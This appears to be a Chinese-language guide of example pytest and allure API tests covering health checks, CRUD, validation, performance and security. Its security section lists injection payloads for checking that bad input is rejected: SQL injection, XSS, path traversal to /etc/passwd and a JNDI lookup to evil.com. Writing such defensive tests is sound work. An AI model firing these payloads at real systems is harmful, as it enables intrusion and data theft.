# 测试用例示例

本文档提供了完整的测试用例示例，展示如何使用企业级API测试自动化框架编写各种类型的测试。

## 📋 目录

- [基础API测试示例](#基础api测试示例)
- [CRUD操作完整示例](#crud操作完整示例)
- [参数化测试示例](#参数化测试示例)
- [性能测试示例](#性能测试示例)
- [安全测试示例](#安全测试示例)
- [契约测试示例](#契约测试示例)
- [集成测试示例](#集成测试示例)

## 🚀 基础API测试示例

### 简单GET请求测试

```python
import pytest
import allure
from framework.core.base_test import BaseAPITest
from framework.utils.assertions import assert_response


@allure.epic("基础API测试")
@allure.feature("健康检查API")
class TestHealthCheck(BaseAPITest):
    """健康检查API测试套件"""

    @pytest.mark.smoke
    @allure.story("系统健康检查")
    @allure.title("检查API服务健康状态")
    def test_health_check_success(self):
        """测试API服务健康检查"""

        with allure.step("发送健康检查请求"):
            response = self.client.get("/health")

        with allure.step("验证健康检查响应"):
            assert_response(response) \
                .has_status_code(200) \
                .has_content_type("application/json") \
                .has_field("status", "healthy") \
                .has_field("timestamp") \
                .response_time_less_than(1000)

    @pytest.mark.smoke
    @allure.story("API版本信息")
    @allure.title("获取API版本信息")
    def test_api_version_info(self):
        """测试获取API版本信息"""

        response = self.client.get("/version")

        assert_response(response) \
            .has_status_code(200) \
            .has_field("version") \
            .has_field("build_date") \
            .has_field("commit_hash")

        # 验证版本格式
        version = response.get_json_path("version")
        assert version.count(".") >= 2, "版本号应该包含主版本.次版本.补丁版本"
```

### POST请求测试

```python
@allure.epic("用户管理")
@allure.feature("用户注册")
class TestUserRegistration(BaseAPITest):
    """用户注册API测试"""

    @pytest.mark.smoke
    @pytest.mark.positive
    @allure.story("用户注册")
    @allure.title("使用有效数据注册新用户")
    def test_register_user_success_valid_data(self, user_data):
        """测试用户注册成功场景"""

        with allure.step("准备用户注册数据"):
            registration_data = {
                "username": user_data["username"],
                "email": user_data["email"],
                "password": "SecurePassword123!",
                "first_name": user_data["first_name"],
                "last_name": user_data["last_name"]
            }

            # 添加测试数据到报告
            allure.attach(
                json.dumps(registration_data, indent=2),
                name="注册数据",
                attachment_type=allure.attachment_type.JSON
            )

        with allure.step("发送用户注册请求"):
            response = self.client.post("/auth/register", json=registration_data)

        with allure.step("验证注册成功响应"):
            assert_response(response) \
                .has_status_code(201) \
                .has_json_schema("user_schema") \
                .has_field("id") \
                .has_field("username", registration_data["username"]) \
                .has_field("email", registration_data["email"]) \
                .has_field("status", "active") \
                .response_time_less_than(3000)

        with allure.step("验证密码未在响应中返回"):
            response_data = response.json()
            assert "password" not in response_data, "响应中不应包含密码字段"

        return response.json()["id"]  # 返回用户ID供后续测试使用
```

## 🔄 CRUD操作完整示例

```python
@allure.epic("产品管理")
@allure.feature("产品CRUD操作")
class TestProductCRUD(BaseAPITest):
    """产品CRUD操作完整测试套件"""

    def setup_method(self):
        """每个测试方法前的设置"""
        self.created_product_ids = []

    def teardown_method(self):
        """每个测试方法后的清理"""
        # 清理创建的产品
        for product_id in self.created_product_ids:
            try:
                self.client.delete(f"/products/{product_id}")
            except Exception as e:
                self.logger.warning(f"清理产品 {product_id} 失败: {e}")

    @pytest.mark.regression
    @allure.story("产品管理")
    @allure.title("完整的产品CRUD操作流程")
    def test_product_crud_complete_workflow(self, product_data):
        """测试产品的完整CRUD操作流程"""

        # CREATE - 创建产品
        with allure.step("步骤1: 创建新产品"):
            create_response = self.client.post("/products", json=product_data)

            assert_response(create_response) \
                .has_status_code(201) \
                .has_json_schema("product_schema") \
                .has_field("id") \
                .has_field("name", product_data["name"]) \
                .has_field("price.amount", product_data["price"]["amount"])

            product_id = create_response.json()["id"]
            self.created_product_ids.append(product_id)

            allure.attach(f"创建的产品ID: {product_id}", name="产品ID")

        # READ - 读取产品
        with allure.step("步骤2: 读取创建的产品"):
            read_response = self.client.get(f"/products/{product_id}")

            assert_response(read_response) \
                .has_status_code(200) \
                .has_field("id", product_id) \
                .has_field("name", product_data["name"]) \
                .response_time_less_than(1000)

        # UPDATE - 更新产品
        with allure.step("步骤3: 更新产品信息"):
            update_data = {
                "name": f"Updated {product_data['name']}",
                "description": "Updated description",
                "price": {
                    "amount": product_data["price"]["amount"] + 10.0,
                    "currency": "USD"
                }
            }

            update_response = self.client.put(f"/products/{product_id}", json=update_data)

            assert_response(update_response) \
                .has_status_code(200) \
                .has_field("id", product_id) \
                .has_field("name", update_data["name"]) \
                .has_field("description", update_data["description"]) \
                .has_field("price.amount", update_data["price"]["amount"])

        # PARTIAL UPDATE - 部分更新
        with allure.step("步骤4: 部分更新产品"):
            patch_data = {"status": "featured"}

            patch_response = self.client.patch(f"/products/{product_id}", json=patch_data)

            assert_response(patch_response) \
                .has_status_code(200) \
                .has_field("status", "featured") \
                .has_field("name", update_data["name"])  # 确保其他字段未变

        # DELETE - 删除产品
        with allure.step("步骤5: 删除产品"):
            delete_response = self.client.delete(f"/products/{product_id}")

            assert_response(delete_response).has_status_code(204)

        # VERIFY DELETE - 验证删除
        with allure.step("步骤6: 验证产品已删除"):
            verify_response = self.client.get(f"/products/{product_id}")

            assert_response(verify_response).has_status_code(404)

            # 从清理列表中移除（已删除）
            self.created_product_ids.remove(product_id)
```

## 📊 参数化测试示例

```python
@allure.epic("数据验证")
@allure.feature("输入验证测试")
class TestInputValidation(BaseAPITest):
    """输入验证参数化测试"""

    @pytest.mark.parametrize("test_case", [
        pytest.param(
            {
                "field": "email",
                "value": "invalid-email",
                "expected_status": 400,
                "expected_error": "Invalid email format"
            },
            marks=pytest.mark.negative,
            id="invalid_email_format"
        ),
        pytest.param(
            {
                "field": "email",
                "value": "",
                "expected_status": 400,
                "expected_error": "Email is required"
            },
            marks=pytest.mark.negative,
            id="empty_email"
        ),
        pytest.param(
            {
                "field": "username",
                "value": "ab",
                "expected_status": 400,
                "expected_error": "Username must be at least 3 characters"
            },
            marks=pytest.mark.boundary,
            id="username_too_short"
        ),
        pytest.param(
            {
                "field": "username",
                "value": "a" * 51,
                "expected_status": 400,
                "expected_error": "Username must be less than 50 characters"
            },
            marks=pytest.mark.boundary,
            id="username_too_long"
        ),
    ])
    @allure.story("用户注册验证")
    @allure.title("用户注册字段验证: {test_case[field]} = {test_case[value]}")
    def test_user_registration_field_validation(self, test_case, user_data):
        """参数化测试用户注册字段验证"""

        with allure.step(f"设置无效的 {test_case['field']} 值"):
            # 复制用户数据并设置无效值
            invalid_data = user_data.copy()
            invalid_data[test_case["field"]] = test_case["value"]

            allure.attach(
                f"字段: {test_case['field']}\n值: '{test_case['value']}'",
                name="测试参数",
                attachment_type=allure.attachment_type.TEXT
            )

        with allure.step("发送包含无效数据的注册请求"):
            response = self.client.post("/auth/register", json=invalid_data)

        with allure.step("验证验证错误响应"):
            assert_response(response) \
                .has_status_code(test_case["expected_status"]) \
                .has_json_schema("error_schema") \
                .contains_text(test_case["expected_error"])

    @pytest.mark.parametrize("page_size", [1, 10, 50, 100])
    @pytest.mark.parametrize("sort_field", ["name", "created_at", "price"])
    @allure.story("产品列表")
    @allure.title("产品列表分页和排序测试")
    def test_product_list_pagination_and_sorting(self, page_size, sort_field):
        """参数化测试产品列表分页和排序"""

        params = {
            "page": 1,
            "per_page": page_size,
            "sort_by": sort_field,
            "sort_order": "asc"
        }

        with allure.step(f"获取产品列表 (每页{page_size}项, 按{sort_field}排序)"):
            response = self.client.get("/products", params=params)

        with allure.step("验证分页响应"):
            assert_response(response) \
                .has_status_code(200) \
                .has_field("products") \
                .has_field("pagination.page", 1) \
                .has_field("pagination.per_page", page_size) \
                .response_time_less_than(2000)

            products = response.get_json_path("products", [])
            assert len(products) <= page_size, f"返回的产品数量不应超过 {page_size}"

            # 验证排序
            if len(products) > 1:
                for i in range(len(products) - 1):
                    current_value = products[i].get(sort_field)
                    next_value = products[i + 1].get(sort_field)

                    if current_value and next_value:
                        assert current_value <= next_value, f"产品列表未按 {sort_field} 正确排序"


## ⚡ 性能测试示例

```python
@allure.epic("性能测试")
@allure.feature("API性能验证")
class TestAPIPerformance(BaseAPITest):
    """API性能测试套件"""

    @pytest.mark.performance
    @allure.story("响应时间测试")
    @allure.title("用户列表查询性能测试")
    def test_user_list_performance(self, performance_threshold):
        """测试用户列表查询性能"""

        response_times = []

        with allure.step("执行多次用户列表查询"):
            for i in range(10):
                start_time = time.time()
                response = self.client.get("/users", params={"limit": 50})
                end_time = time.time()

                response_time_ms = (end_time - start_time) * 1000
                response_times.append(response_time_ms)

                assert_response(response).has_status_code(200)

        with allure.step("分析性能指标"):
            avg_time = statistics.mean(response_times)
            max_time = max(response_times)
            min_time = min(response_times)
            p95_time = statistics.quantiles(response_times, n=20)[18]

            # 添加性能指标到报告
            allure.attach(
                f"平均响应时间: {avg_time:.2f}ms\n"
                f"最大响应时间: {max_time:.2f}ms\n"
                f"最小响应时间: {min_time:.2f}ms\n"
                f"95%分位数: {p95_time:.2f}ms\n"
                f"性能阈值: {performance_threshold}ms",
                name="性能指标",
                attachment_type=allure.attachment_type.TEXT
            )

            # 验证性能要求
            assert avg_time < performance_threshold, \
                f"平均响应时间 {avg_time:.2f}ms 超过阈值 {performance_threshold}ms"
            assert p95_time < performance_threshold * 1.5, \
                f"95%分位数响应时间 {p95_time:.2f}ms 超过阈值"

    @pytest.mark.performance
    @pytest.mark.slow
    @allure.story("并发测试")
    @allure.title("用户创建并发性能测试")
    def test_user_creation_concurrent_performance(self, data_factory):
        """测试用户创建并发性能"""

        import concurrent.futures
        import threading

        num_concurrent_users = 5
        requests_per_user = 3
        results = []

        def create_user_concurrent(user_index):
            """并发创建用户的函数"""
            thread_results = []

            for request_index in range(requests_per_user):
                user_data = data_factory.create_user(
                    username=f"perf_user_{user_index}_{request_index}",
                    email=f"perf_{user_index}_{request_index}@example.com"
                )

                start_time = time.time()
                try:
                    response = self.client.post("/users", json=user_data)
                    end_time = time.time()

                    thread_results.append({
                        'success': response.status_code == 201,
                        'response_time': (end_time - start_time) * 1000,
                        'user_index': user_index,
                        'request_index': request_index
                    })
                except Exception as e:
                    thread_results.append({
                        'success': False,
                        'error': str(e),
                        'user_index': user_index,
                        'request_index': request_index
                    })

            return thread_results

        with allure.step(f"执行 {num_concurrent_users} 个并发用户创建"):
            with concurrent.futures.ThreadPoolExecutor(max_workers=num_concurrent_users) as executor:
                futures = [
                    executor.submit(create_user_concurrent, i)
                    for i in range(num_concurrent_users)
                ]

                for future in concurrent.futures.as_completed(futures):
                    results.extend(future.result())

        with allure.step("分析并发性能结果"):
            successful_requests = [r for r in results if r['success']]
            failed_requests = [r for r in results if not r['success']]

            success_rate = len(successful_requests) / len(results) * 100

            if successful_requests:
                response_times = [r['response_time'] for r in successful_requests]
                avg_response_time = statistics.mean(response_times)
            else:
                avg_response_time = 0

            # 添加并发测试结果
            allure.attach(
                f"总请求数: {len(results)}\n"
                f"成功请求数: {len(successful_requests)}\n"
                f"失败请求数: {len(failed_requests)}\n"
                f"成功率: {success_rate:.2f}%\n"
                f"平均响应时间: {avg_response_time:.2f}ms",
                name="并发测试结果",
                attachment_type=allure.attachment_type.TEXT
            )

            # 验证并发性能要求
            assert success_rate >= 90, f"并发成功率 {success_rate:.2f}% 低于90%阈值"
            assert avg_response_time < 5000, f"并发平均响应时间 {avg_response_time:.2f}ms 超过5秒阈值"


## 🔒 安全测试示例

```python
@allure.epic("安全测试")
@allure.feature("API安全验证")
class TestAPISecurity(BaseAPITest):
    """API安全测试套件"""

    @pytest.mark.security
    @allure.story("认证安全")
    @allure.title("未授权访问测试")
    def test_unauthorized_access_protection(self):
        """测试未授权访问保护"""

        # 保存原始认证头
        original_auth = self.client.session.headers.get('Authorization')

        try:
            with allure.step("移除认证头"):
                self.client.remove_header('Authorization')

            with allure.step("尝试访问受保护的端点"):
                protected_endpoints = [
                    "/users/profile",
                    "/admin/users",
                    "/users/123/delete"
                ]

                for endpoint in protected_endpoints:
                    response = self.client.get(endpoint)

                    assert_response(response).has_status_code(401)

                    # 验证错误消息
                    error_data = response.json_safe({})
                    assert "unauthorized" in str(error_data).lower() or \
                           "authentication" in str(error_data).lower(), \
                           f"端点 {endpoint} 未返回适当的认证错误消息"

        finally:
            # 恢复认证头
            if original_auth:
                self.client.set_header('Authorization', original_auth)

    @pytest.mark.security
    @pytest.mark.parametrize("injection_payload", [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}"
    ])
    @allure.story("注入攻击防护")
    @allure.title("SQL注入和XSS防护测试")
    def test_injection_attack_protection(self, injection_payload, user_data):
        """测试注入攻击防护"""

        with allure.step(f"使用注入载荷测试: {injection_payload}"):
            # 在用户数据中注入恶意载荷
            malicious_data = user_data.copy()
            malicious_data["username"] = injection_payload
            malicious_data["email"] = f"test+{injection_payload}@example.com"

            allure.attach(
                injection_payload,
                name="注入载荷",
                attachment_type=allure.attachment_type.TEXT
            )

        with allure.step("发送包含恶意载荷的请求"):
            response = self.client.post("/users", json=malicious_data)

        with allure.step("验证系统安全防护"):
            # 系统应该拒绝恶意输入或安全处理
            assert response.status_code in [400, 422], \
                f"系统应该拒绝恶意输入，但返回了状态码 {response.status_code}"

            # 如果创建成功，验证数据已被安全处理
            if response.status_code == 201:
                created_user = response.json()
                assert created_user["username"] != injection_payload, \
                    "恶意载荷未被过滤或转义"

    @pytest.mark.security
    @allure.story("敏感数据保护")
    @allure.title("敏感信息泄露测试")
    def test_sensitive_data_protection(self, user_data):
        """测试敏感信息保护"""

        with allure.step("创建用户账户"):
            registration_data = user_data.copy()
            registration_data["password"] = "SecretPassword123!"
            registration_data["ssn"] = "123-45-6789"  # 敏感信息

            response = self.client.post("/auth/register", json=registration_data)

            if response.status_code != 201:
                pytest.skip("用户创建失败，跳过敏感数据测试")

            user_id = response.json()["id"]

        with allure.step("验证响应中不包含敏感信息"):
            user_response = self.client.get(f"/users/{user_id}")
            user_data_response = user_response.json()

            # 检查敏感字段不在响应中
            sensitive_fields = ["password", "ssn", "credit_card", "bank_account"]

            for field in sensitive_fields:
                assert field not in user_data_response, \
                    f"响应中不应包含敏感字段: {field}"

            # 检查响应中没有明文敏感信息
            response_text = str(user_data_response).lower()
            sensitive_patterns = ["password", "123-45-6789", "secret"]

            for pattern in sensitive_patterns:
                assert pattern not in response_text, \
                    f"响应中包含敏感信息: {pattern}"
```